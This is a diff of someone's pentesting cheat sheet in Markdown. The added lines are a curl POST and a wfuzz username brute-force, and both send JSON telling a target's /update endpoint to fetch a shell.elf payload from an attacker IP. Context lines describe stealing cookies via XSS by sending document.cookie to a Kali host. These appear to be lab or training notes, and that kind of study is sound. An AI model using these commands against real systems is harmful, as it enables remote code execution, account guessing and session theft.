@@ -18,6 +18,8 @@
 # Web Enum
 - curl POST ``` curl -X POST -d "code=2*2" http://192.168.171.117:50000/verify```
 
+- curl POST w/ JSON ``` curl -v -X POST -H "Content-Type: application/json" -d '{"user":"clumsyadmin", "url":"http://192.168.45.197/shell.elf"}' "http://192.168.173.134:13337/update"  ```
+
 ## Gobuster enum API
 - Provide pattern in pattern file
     ``` {GOBUSTER}/v1 ```
@@ -37,7 +39,12 @@
 
 - http file to markdown
   ``` curl -s http://192.168.244.140:8000/ | html2markdown ```
-    
+
+## wFuzz
+- https://book.hacktricks.xyz/pentesting-web/web-tool-wfuzz 
+1. ``` wfuzz -c -z file,/usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt -d '{"user":FUZZ,"url":"http://192.168.45.197/shell.elf"}' -H "Content-Type: application/json" -t 20 -v http://192.168.173.134:13337/update ```
+
+
 # Try Default password !!!
 
 ## XSS
@@ -148,3 +155,5 @@ $cli_runner = new CLI_Runner();
 ```
 2. craft new_website_url: ``` original_url+params?=windows.location='kali_ip'/document.cookies ```
 3. call local web and will redirect to the victim web and then pass the cookie thru http call back 
+
+
